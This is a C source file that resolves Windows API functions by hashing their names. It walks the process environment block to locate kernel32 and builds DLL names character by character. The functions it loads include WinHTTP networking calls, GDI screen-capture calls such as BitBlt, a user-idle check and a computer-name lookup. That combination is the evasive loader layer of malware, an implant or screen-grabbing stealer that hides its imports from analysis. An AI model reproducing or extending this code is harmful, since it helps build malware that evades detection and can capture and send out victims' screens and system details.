#include "func.h"

uint32_t calc_hashW2(wchar_t* str, int len) {
	uint32_t seed = 131;  // 31 131 1313 13131 131313 etc..
	uint32_t hash = 0;
	for (int i = 0; i < len; i++) {
		wchar_t s = *str++;
		if (s >= 'a') s = s - 0x20;
		hash = hash * seed + s;
	}
	return (hash & 0x7FFFFFFF);
}

HMODULE get_kernel32_base() {
	_PPEB peb = 0;
#ifdef _WIN64
	peb = (_PPEB)__readgsqword(0x60);  // peb
#else
	peb = (_PPEB)__readfsdword(0x30);
#endif
	LIST_ENTRY* entry = peb->pLdr->InMemoryOrderModuleList.Flink;
	while (entry) {
		PLDR_DATA_TABLE_ENTRY e = (PLDR_DATA_TABLE_ENTRY)entry;
		if (calc_hashW2(e->BaseDllName.pBuffer, e->BaseDllName.Length / 2) == Kernel32Lib_Hash) {
			return (HMODULE)e->DllBase;
		}
		entry = entry->Flink;
	}
	return 0;
};

uint32_t calc_hash(char* str) {
	uint32_t seed = 131; // 31 131 1313 13131 131313 etc..
	uint32_t hash = 0;
	while (*str) {
		hash = hash * seed + (*str++);
	}
	return (hash & 0x7FFFFFFF);
}

void* get_proc_address_from_hash(HMODULE module, uint32_t func_hash, _GetProcAddress get_proc_address) {
	PIMAGE_DOS_HEADER dosh = cast(PIMAGE_DOS_HEADER, module);
	PIMAGE_NT_HEADERS nth = cast_offset(PIMAGE_NT_HEADERS, module, dosh->e_lfanew);
	PIMAGE_DATA_DIRECTORY dataDict = &nth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	if (dataDict->VirtualAddress == 0 || dataDict->Size == 0) return 0;
	PIMAGE_EXPORT_DIRECTORY exportDict = cast_offset(PIMAGE_EXPORT_DIRECTORY, module, dataDict->VirtualAddress);
	if (exportDict->NumberOfNames == 0) return 0;
	uint32_t* fn = cast_offset(uint32_t*, module, exportDict->AddressOfNames);
	uint32_t* fa = cast_offset(uint32_t*, module, exportDict->AddressOfFunctions);
	uint16_t* ord = cast_offset(uint16_t*, module, exportDict->AddressOfNameOrdinals);
	for (uint32_t i = 0; i < exportDict->NumberOfNames; i++) {
		char* name = cast_offset(char*, module, fn[i]);
		if (calc_hash(name) != func_hash) continue;
		return get_proc_address == 0 ? cast_offset(void*, module, fa[ord[i]]) : get_proc_address(module, name);
	}
	return 0;
}

void init_func(func_p func) {
    HMODULE kernel32 = get_kernel32_base();
    func->GetProcAddress = (_GetProcAddress)get_proc_address_from_hash(kernel32, GetProcAddress_Hash, 0);
    func->LoadLibraryA = (_LoadLibraryA)get_proc_address_from_hash(kernel32, LoadLibraryA_Hash, func->GetProcAddress);
    func->CloseHandle = (_CloseHandle)get_proc_address_from_hash(kernel32, CloseHandle_Hash, func->GetProcAddress);
    func->Sleep = (_Sleep)get_proc_address_from_hash(kernel32, Sleep_Hash, func->GetProcAddress);
    func->OutputDebugStringA = (_OutputDebugStringA)get_proc_address_from_hash(kernel32, OutputDebugStringA_Hash, func->GetProcAddress);
    func->lstrlenW = (_lstrlenW)get_proc_address_from_hash(kernel32, lstrlenW_Hash, func->GetProcAddress);
    func->lstrlenA = (_lstrlenA)get_proc_address_from_hash(kernel32, lstrlenA_Hash, func->GetProcAddress);
    func->GetComputerNameA = (_GetComputerNameA)get_proc_address_from_hash(kernel32, GetComputerNameA_Hash, func->GetProcAddress);
    func->GetTickCount64 = (_GetTickCount64)get_proc_address_from_hash(kernel32, GetTickCount64_Hash, func->GetProcAddress);
    func->CreateThread = (_CreateThread)get_proc_address_from_hash(kernel32, CreateThread_Hash, func->GetProcAddress);


    char sUser32[] = { 'u','s','e' ,'r' ,'3' ,'2', 0 };
    HMODULE user32 = func->LoadLibraryA(sUser32);
    func->SetProcessDPIAware = (_SetProcessDPIAware)get_proc_address_from_hash(user32, SetProcessDPIAware_Hash, func->GetProcAddress);
    func->GetSystemMetrics = (_GetSystemMetrics)get_proc_address_from_hash(user32, GetSystemMetrics_Hash, func->GetProcAddress);
    func->GetLastInputInfo = (_GetLastInputInfo)get_proc_address_from_hash(user32, GetLastInputInfo_Hash, func->GetProcAddress);

    char sMsvcrt[] = { 'm', 's', 'v', 'c', 'r', 't',0 };
    HMODULE msvcrt = func->LoadLibraryA(sMsvcrt);
    func->memcpy = (_memcpy)get_proc_address_from_hash(msvcrt, memcpy_Hash, func->GetProcAddress);
    func->malloc = (_malloc)get_proc_address_from_hash(msvcrt, malloc_Hash, func->GetProcAddress);
    func->free = (_free)get_proc_address_from_hash(msvcrt, free_Hash, func->GetProcAddress);
    func->memset = (_memset)get_proc_address_from_hash(msvcrt, memset_Hash, func->GetProcAddress);

    char sWinhttp[] = { 'w','i','n','h','t','t','p', 0 };
    HMODULE winhttp = func->LoadLibraryA(sWinhttp);
    func->WinHttpOpen = (_WinHttpOpen)get_proc_address_from_hash(winhttp, WinHttpOpen_Hash, func->GetProcAddress);
    func->WinHttpReceiveResponse = (_WinHttpReceiveResponse)get_proc_address_from_hash(winhttp, WinHttpReceiveResponse_Hash, func->GetProcAddress);
    func->WinHttpReadData = (_WinHttpReadData)get_proc_address_from_hash(winhttp, WinHttpReadData_Hash, func->GetProcAddress);
    func->WinHttpQueryHeaders = (_WinHttpQueryHeaders)get_proc_address_from_hash(winhttp, WinHttpQueryHeaders_Hash, func->GetProcAddress);
    func->WinHttpOpenRequest = (_WinHttpOpenRequest)get_proc_address_from_hash(winhttp, WinHttpOpenRequest_Hash, func->GetProcAddress);
    func->WinHttpSetOption = (_WinHttpSetOption)get_proc_address_from_hash(winhttp, WinHttpSetOption_Hash, func->GetProcAddress);
    func->WinHttpCloseHandle = (_WinHttpCloseHandle)get_proc_address_from_hash(winhttp, WinHttpCloseHandle_Hash, func->GetProcAddress);
    func->WinHttpSendRequest = (_WinHttpSendRequest)get_proc_address_from_hash(winhttp, WinHttpSendRequest_Hash, func->GetProcAddress);
    func->WinHttpConnect = (_WinHttpConnect)get_proc_address_from_hash(winhttp, WinHttpConnect_Hash, func->GetProcAddress);
    func->WinHttpCrackUrl = (_WinHttpCrackUrl)get_proc_address_from_hash(winhttp, WinHttpCrackUrl_Hash, func->GetProcAddress);
    func->WinHttpAddRequestHeaders = (_WinHttpAddRequestHeaders)get_proc_address_from_hash(winhttp, WinHttpAddRequestHeaders_Hash, func->GetProcAddress);

    char sGdi32[] = { 'g','d','i','3','2', 0 };
    HMODULE gdi32 = func->LoadLibraryA(sGdi32);
    func->CreateDCW = (_CreateDCW)get_proc_address_from_hash(gdi32, CreateDCW_Hash, func->GetProcAddress);
    func->CreateCompatibleDC = (_CreateCompatibleDC)get_proc_address_from_hash(gdi32, CreateCompatibleDC_Hash, func->GetProcAddress);
    func->CreateCompatibleBitmap = (_CreateCompatibleBitmap)get_proc_address_from_hash(gdi32, CreateCompatibleBitmap_Hash, func->GetProcAddress);
    func->SelectObject = (_SelectObject)get_proc_address_from_hash(gdi32, SelectObject_Hash, func->GetProcAddress);
    func->BitBlt = (_BitBlt)get_proc_address_from_hash(gdi32, BitBlt_Hash, func->GetProcAddress);
    func->GetObjectW = (_GetObjectW)get_proc_address_from_hash(gdi32, GetObjectW_Hash, func->GetProcAddress);
    func->DeleteObject = (_DeleteObject)get_proc_address_from_hash(gdi32, DeleteObject_Hash, func->GetProcAddress);
    func->DeleteDC = (_DeleteDC)get_proc_address_from_hash(gdi32, DeleteDC_Hash, func->GetProcAddress);

    char sOle32[] = { 'o','l','e','3','2',0 };
    HMODULE ole32 = func->LoadLibraryA(sOle32);
    func->CoInitializeEx = (_CoInitializeEx)get_proc_address_from_hash(ole32, CoInitializeEx_Hash, func->GetProcAddress);
    func->CoCreateInstance = (_CoCreateInstance)get_proc_address_from_hash(ole32, CoCreateInstance_Hash, func->GetProcAddress);

}